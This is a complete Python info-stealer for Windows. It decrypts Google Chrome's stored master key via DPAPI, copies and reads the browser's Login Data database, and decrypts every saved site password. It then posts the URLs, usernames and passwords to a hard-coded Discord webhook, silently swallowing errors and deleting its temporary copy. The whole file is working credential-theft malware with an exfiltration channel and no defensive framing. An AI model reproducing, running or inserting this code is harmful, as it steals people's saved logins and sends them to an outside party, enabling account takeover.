import os
import json
import base64
import sqlite3
import shutil
import requests
import win32crypt
from Crypto.Cipher import AES

# Your Discord Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1487847279019823295/4_xgpgGzfOfqqdOrVIsNqANdbM0OUWyDLk4rm9ulXI5F8OHH4GyE7VhNvhk1xQI0RBw6"

def get_master_key():
    local_state_path = os.path.join(os.environ['USERPROFILE'], 
                                    'AppData', 'Local', 'Google', 'Chrome', 
                                    'User Data', 'Local State')
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except Exception:
        return ""

def grab_passwords():
    master_key = get_master_key()
    login_db = os.path.join(os.environ['USERPROFILE'], 
                            'AppData', 'Local', 'Google', 'Chrome', 
                            'User Data', 'Default', 'Login Data')
    
    temp_db = "temp_db.sqlite"
    if os.path.exists(temp_db):
        os.remove(temp_db)
    
    shutil.copy2(login_db, temp_db)
    
    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
    
    credentials = []
    for row in cursor.fetchall():
        url = row[0]
        user = row[1]
        encrypted_pass = row[2]
        
        if user or encrypted_pass:
            password = decrypt_password(encrypted_pass, master_key)
            if password:
                credentials.append(f"URL: {url}\nUser: {user}\nPass: {password}\n---")
    
    if credentials:
        # Split into chunks if there are too many passwords for one Discord message
        full_message = "\n".join(credentials)
        for i in range(0, len(full_message), 2000):
            requests.post(WEBHOOK_URL, json={"content": full_message[i:i+2000]})
    
    conn.close()
    if os.path.exists(temp_db):
        os.remove(temp_db)

if __name__ == "__main__":
    try:
        grab_passwords()
    except Exception:
        pass
